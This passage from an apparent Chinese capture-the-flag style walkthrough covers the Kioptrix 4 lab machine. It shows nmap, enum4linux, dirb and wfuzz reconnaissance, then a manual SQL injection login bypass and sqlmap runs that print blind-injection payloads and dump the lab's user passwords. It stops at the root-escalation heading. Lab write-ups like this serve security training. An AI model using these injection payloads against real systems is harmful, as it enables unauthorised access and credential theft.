VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: <span class="number">2009</span>-<span class="number">09</span>-<span class="number">17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-vuln-cve2017-<span class="number">1001000</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:<span class="number">2.2</span>.<span class="number">8</span>: </span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0425</span>   <span class="number">10.0</span>    https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0425</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3192</span>   <span class="number">7.8</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3192</span></span><br><span class="line">|       CVE-<span class="number">2017</span>-<span class="number">7679</span>   <span class="number">7.5</span>     https://vulners.com/cve/CVE-<span class="number">2017</span>-<span class="number">7679</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">2249</span>   <span class="number">7.5</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">2249</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1891</span>   <span class="number">7.1</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1891</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1890</span>   <span class="number">7.1</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1890</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">0883</span>   <span class="number">6.9</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0883</span></span><br><span class="line">|       CVE-<span class="number">2018</span>-<span class="number">1312</span>   <span class="number">6.8</span>     https://vulners.com/cve/CVE-<span class="number">2018</span>-<span class="number">1312</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">1862</span>   <span class="number">5.1</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">1862</span></span><br><span class="line">|       CVE-<span class="number">2014</span>-<span class="number">0231</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2014</span>-<span class="number">0231</span></span><br><span class="line">|       CVE-<span class="number">2014</span>-<span class="number">0098</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2014</span>-<span class="number">0098</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">6438</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">6438</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3368</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3368</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">1452</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">1452</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0408</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0408</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">2699</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">2699</span></span><br><span class="line">|       CVE-<span class="number">2008</span>-<span class="number">2364</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2008</span>-<span class="number">2364</span></span><br><span class="line">|       CVE-<span class="number">2007</span>-<span class="number">6750</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1195</span>   <span class="number">4.9</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1195</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">0031</span>   <span class="number">4.6</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0031</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3607</span>   <span class="number">4.4</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3607</span></span><br><span class="line">|       CVE-<span class="number">2016</span>-<span class="number">4975</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2016</span>-<span class="number">4975</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">1896</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">1896</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">4558</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">4558</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">3499</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">3499</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">0053</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0053</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">4317</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">4317</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3639</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3639</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3348</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3348</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">0419</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">0419</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0434</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0434</span></span><br><span class="line">|       CVE-<span class="number">2008</span>-<span class="number">2939</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2008</span>-<span class="number">2939</span></span><br><span class="line">|       CVE-<span class="number">2016</span>-<span class="number">8612</span>   <span class="number">3.3</span>     https://vulners.com/cve/CVE-<span class="number">2016</span>-<span class="number">8612</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">2687</span>   <span class="number">2.6</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">2687</span></span><br><span class="line">|_      CVE-<span class="number">2011</span>-<span class="number">4415</span>   <span class="number">1.2</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">4415</span></span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (workgroup: WORKGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line"><span class="number">445</span>/tcp open  netbios-ssn Samba smbd <span class="number">3</span>.X - <span class="number">4</span>.X (workgroup: WORKGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:F3:<span class="number">0</span>E:E9 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">2.6</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">2.6</span></span><br><span class="line">OS details: Linux <span class="number">2.6</span>.<span class="number">9</span> - <span class="number">2.6</span>.<span class="number">33</span></span><br><span class="line">Uptime guess: <span class="number">0.009</span> days (since Mon Dec  <span class="number">9</span> <span class="number">20</span>:<span class="number">49</span>:<span class="number">38</span> <span class="number">2019</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=<span class="number">203</span> (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-<span class="number">054</span>: false</span><br><span class="line">|_smb-vuln-ms10-<span class="number">061</span>: false</span><br><span class="line">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>
<p>使用工具enum4linux得到如下信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># enum4linux 192.168.84.139</span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec 10 00:55:51 2019</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.84.139</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ====================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.84.139    |</span><br><span class="line"> ====================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.84.139    |</span><br><span class="line"> ============================================== </span><br><span class="line">Looking up status of 192.168.84.139</span><br><span class="line">        KIOPTRIX4       &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        KIOPTRIX4       &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        KIOPTRIX4       &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    Session Check on 192.168.84.139    |</span><br><span class="line"> ======================================= </span><br><span class="line">[E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br></pre></td></tr></table></figure>

<p>dirb扫目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.84.139/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Dec 10 00:58:55 2019</span><br><span class="line">URL_BASE: http://192.168.84.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.84.139/ ----</span><br><span class="line">+ http://192.168.84.139/cgi-bin/ (CODE:403|SIZE:329)                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/images/                                                  </span><br><span class="line">+ http://192.168.84.139/index (CODE:200|SIZE:1255)                                            </span><br><span class="line">+ http://192.168.84.139/index.php (CODE:200|SIZE:1255)                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.84.139/john/                                                    </span><br><span class="line">+ http://192.168.84.139/logout (CODE:302|SIZE:0)                                              </span><br><span class="line">+ http://192.168.84.139/member (CODE:302|SIZE:220)                                            </span><br><span class="line">+ http://192.168.84.139/server-status (CODE:403|SIZE:334)                                     </span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                              </span><br><span class="line">---- Entering directory: http://192.168.84.139/john/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Dec 10 00:59:00 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></table></figure>
<p>wfuzz进行模糊测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.84.139/FUZZ</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4 - The Web Fuzzer                           *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.84.139/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 3024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                             </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000566:   403        10 L     33 W     329 Ch      &quot;cgi-bin/&quot;                          </span></span><br><span class="line"><span class="string">000001337:   301        9 L      31 W     356 Ch      &quot;images&quot;                            </span></span><br><span class="line"><span class="string">000001350:   200        45 L     94 W     1255 Ch     &quot;index&quot;                             </span></span><br><span class="line"><span class="string">000001458:   301        9 L      31 W     354 Ch      &quot;john&quot;                              </span></span><br><span class="line"><span class="string">000001629:   302        0 L      0 W      0 Ch        &quot;logout&quot;                            </span></span><br><span class="line"><span class="string">000001736:   302        1 L      22 W     220 Ch      &quot;member&quot;                            </span></span><br><span class="line"><span class="string">000002294:   301        9 L      31 W     356 Ch      &quot;robert&quot;                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 3.234193</span></span><br><span class="line"><span class="string">Processed Requests: 3024</span></span><br><span class="line"><span class="string">Filtered Requests: 3017</span></span><br><span class="line"><span class="string">Requests/sec.: 935.0089</span></span><br></pre></td></tr></table></figure>

<p>访问页面，发现登录口存在sql注入漏洞</p>
<ul>
<li>手工注入</li>
</ul>
<p>用户名使用john，密码使用1’ or ‘1’&#x3D;’1</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub34.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub35.jpg"></p>
<p>得到两个密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username 	: 	john</span><br><span class="line">Password 	: 	MyNameIsJohn</span><br><span class="line"></span><br><span class="line">Username 	: 	robert</span><br><span class="line">Password 	: 	ADGAdsafdfwt4gadfga==</span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap</li>
</ul>
<p>跑出注入点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                   </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                      </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                      </span><br><span class="line">|___|_  [<span class="string">&#x27;]_|_|_|__,|  _|                                                                      </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 01:21:00 /2019-12-10/</span><br><span class="line"></span><br><span class="line">[01:21:00] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[01:21:00] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[01:21:00] [INFO] testing connection to the target URL</span><br><span class="line">[01:21:00] [INFO] heuristics detected web page charset <span class="string">&#x27;ascii&#x27;</span></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-9812<span class="string">&#x27; OR 1343=1343#&amp;Submit=Login</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=123456&#x27;</span> AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[01:21:00] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[01:21:00] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.84.139&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 01:21:00 /2019-12-10/</span><br></pre></td></tr></table></figure>
<p>跑出账号密码,果真还是sqlmap屌炸天！！！！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D members -T members --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                         </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.11<span class="comment">#stable&#125;                                                            </span></span><br><span class="line">|_ -| . [)]     | .<span class="string">&#x27;| . |                                                                            </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                            </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                          </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 01:25:36 /2019-12-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:36] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[01:25:36] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] heuristics detected web page charset &#x27;</span>ascii<span class="string">&#x27;</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: mypassword (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: myusername=admin&amp;mypassword=-9812&#x27;</span> OR 1343=1343<span class="comment">#&amp;Submit=Login</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123456<span class="string">&#x27; AND (SELECT 6154 FROM (SELECT(SLEEP(5)))jArz)-- bHnL&amp;Submit=Login</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] fetching columns for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:36] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="string">&#x27; for faster data retrieval</span></span><br><span class="line"><span class="string">[01:25:36] [INFO] retrieved: </span></span><br><span class="line"><span class="string">sqlmap got a 302 redirect to &#x27;</span>http://192.168.84.139:80/login_success.php?username=admin<span class="string">&#x27;. Do you want to follow? [Y/n] n</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: id</span></span><br><span class="line"><span class="string">[01:25:38] [INFO] retrieved: username</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: password</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] fetching number of entries for table &#x27;</span>members<span class="string">&#x27; in database &#x27;</span>members<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[01:25:39] [INFO] retrieved: MyNameIsJohn</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: john</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[01:25:40] [INFO] retrieved: ADGAdsafdfwt4gadfga==</span></span><br><span class="line"><span class="string">[01:25:42] [INFO] retrieved: robert</span></span><br><span class="line"><span class="string">Database: members</span></span><br><span class="line"><span class="string">Table: members</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| id | password              | username |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | MyNameIsJohn          | john     |</span></span><br><span class="line"><span class="string">| 2  | ADGAdsafdfwt4gadfga== | robert   |</span></span><br><span class="line"><span class="string">+----+-----------------------+----------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[01:25:42] [INFO] table &#x27;</span>members.members<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/192.168.84.139/dump/members/members.csv<span class="string">&#x27;                                                                               </span></span><br><span class="line"><span class="string">[01:25:42] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/192.168.84.139<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 01:25:42 /2019-12-10/</span></span><br></pre></td></tr></table></figure>

<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>ssh连接之后发现许多命令无法执行,但是可以执行echo命令</p>
